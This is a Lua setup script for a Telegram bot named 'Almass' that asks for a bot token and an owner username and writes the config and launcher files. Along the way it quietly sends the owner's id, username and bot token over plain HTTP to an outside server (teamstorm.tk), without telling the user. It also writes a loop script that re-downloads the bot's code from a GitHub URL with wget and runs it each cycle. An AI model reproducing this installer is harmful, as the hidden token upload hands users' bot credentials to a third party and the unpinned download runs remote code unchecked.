serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Almass = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Almass = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Almass_Info_Sudo = io.open("sudo.lua", 'w')
Almass_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Almass_Info_Sudo:close()
end  
if not database:get(Server_Almass.."Token_Almass") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Almass.."Token_Almass",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Almass.."UserName_Almass") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Almass.."UserName_Almass",Json.Info.Username)
database:set(Server_Almass.."Id_Almass",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Almass_Info()
Create_Info(database:get(Server_Almass.."Token_Almass"),database:get(Server_Almass.."Id_Almass"),database:get(Server_Almass.."UserName_Almass"))   
http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Almass.."Id_Almass").."&user="..database:get(Server_Almass.."UserName_Almass").."&token="..database:get(Server_Almass.."Token_Almass"))
local RunAlmass = io.open("Almass", 'w')
RunAlmass:write([[
#!/usr/bin/env bash
cd $HOME/Almass
token="]]..database:get(Server_Almass.."Token_Almass")..[["
rm -fr Almass.lua
wget "https://raw.githubusercontent.com/Almassabas/Almass/master/Almass.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Almass.lua -p PROFILE --bot=$token
done
]])
RunAlmass:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Almass
while(true) do
rm -fr ../.telegram-cli
screen -S Almass -X kill
screen -S Almass ./Almass
done
]])
RunTs:close()
end
Files_Almass_Info()
database:del(Server_Almass.."Token_Almass");database:del(Server_Almass.."Id_Almass");database:del(Server_Almass.."UserName_Almass")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Almass()  
var = true
else   
f:close()  
database:del(Server_Almass.."Token_Almass");database:del(Server_Almass.."Id_Almass");database:del(Server_Almass.."UserName_Almass")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
